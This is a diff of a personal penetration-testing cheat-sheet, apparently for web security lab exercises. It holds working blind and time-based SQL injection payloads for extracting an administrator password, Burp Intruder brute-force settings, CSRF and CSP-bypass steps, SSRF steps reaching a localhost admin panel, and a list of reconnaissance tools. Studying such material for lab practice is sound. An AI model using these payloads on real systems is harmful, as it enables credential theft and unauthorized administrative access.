@@ -189,7 +189,7 @@ sudo openvpn nmap -sV {target IP}
 - {'+union+select+username,password+from+users+where+username='administrator'--} --select password belonging to a specific user
 
 **BLIND SQLi**
-[+] test request cookies tracking ID with a FALSE statement(' anD 1=2--) then enter and FORWARD request and note changes
+[+] test request cookies tracking ID in REPEATER with a FALSE statement(' anD 1=2--) then enter and send REQUEST and note changes in RESPONSE
 [+] {' anD (SELECT 'a' FROM users LIMIT 1)='a'--} -- select users table from tracking ID
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator')='a'--} --select a specific user from user_column
 [+] {' anD (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--} --guessing userpass length from DB table
@@ -203,7 +203,7 @@ sudo openvpn nmap -sV {target IP}
 - FROM:0 TO:20 STEP:1 then run a second set for the payload and set PAYLOAD to BRUTE FORCER MIN:1 MAX:1
 - check for the ones with different LENGTH value and write them out --SQL payload to bruteforce admin pass
 [+] check for the kinda sql used 
-- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) --testing for blind SQL injection using time based SQLi in tracking ID field
+- {'||pg_sleep(10)--} paste in tracking ID ( this is PSTGRE) 
 - {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--} paste this in tracking ID --conditional time based blind SQLi(PSTGRE)
 - try for both TRUE and FALSE statement to know if the website is vulnerable to blind SQL
 - if web app responds, try to select from users table {'||(SELECT CASE WHEN (2=2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--}
@@ -219,10 +219,7 @@ sudo openvpn nmap -sV {target IP}
 - use CLUSTER BOMB attack and payload as NUMBERS, FROM:1 TO:20 STEPS:1
 - use BRUTE FORCER for next pane, because it's a time based SQL got to REQUEST POOL and change request max to 1
 - start attck, go to columns in RESULT and enable RESPONSE RECIEVED 
-- check for response time over 1000 
-- 
-
-
+- check for response time over 1000 --testing for blind SQL injection using time based SQLi in tracking ID field
 
 
 [+] test login with {'} if internal error shows then it allows SQLi
@@ -266,7 +263,7 @@ sudo openvpn nmap -sV {target IP}
 [+] 
 
 #CSRF
-[+] Copy the element of a user section(email upadte frame) and paste in file 
+[+] Copy the element of a user section(email update frame) and paste in file 
 - add the url path from the main site to the action form
 - load up file on web browser, try update email/password from there
 - check back on main site if request  was forged 
@@ -319,6 +316,23 @@ sudo openvpn nmap -sV {target IP}
 - add {;script-src-elem 'unsafe-inline'} to URL containing XSS and paste in browser --CSP token
 
 
+#SSRF 
+[+] INTERCEPT the check stock option, check for the STOCK API(mostly URL encoded so highlight it and right click convert/URL/decode)
+- test the functionality of the stockAPI request section by changing it to "=http://localhost/" then URL encode this because the WA initiatlly did this 
+- foward request till page loads within itself 
+- copy ADMIN page URL loaded within the site and INTERCEPT "checkstock" again
+- paste/check the destination of admin panel and paste in stockAPI "http://localhost/admin"
+- interecept checkstock again and copy URL to delete/whatever action to perform and paste in stockAPI ENCODE & DECODE
+- Do not remove interception till youre done on admin page because of WAF  -- SSRF with lacal server
+[+] Test "check stock" option 
+- decode the URL and check where the IP hosting the web server, test the IP by changing its value 
+- send request to intruder, clear $ signs, add $last_no_in_IP$ 
+- PAYLOAD TYPE:number, FROM:1, TO: 254, STEP: 1
+- 
+
+
+
+
 *******************************
 ****INFORMATION GATHERING******
 
@@ -358,8 +372,14 @@ knockpy
 dirsearch
 [dir enum]
 
+dirdar
+[bruteforce 403-forbidden]
+
 theHarvest -d (url) -l 500 -b (where to check)
 [harvest site email]
+
+zap
+[web analysis]
 
 Nikto
 [ ]
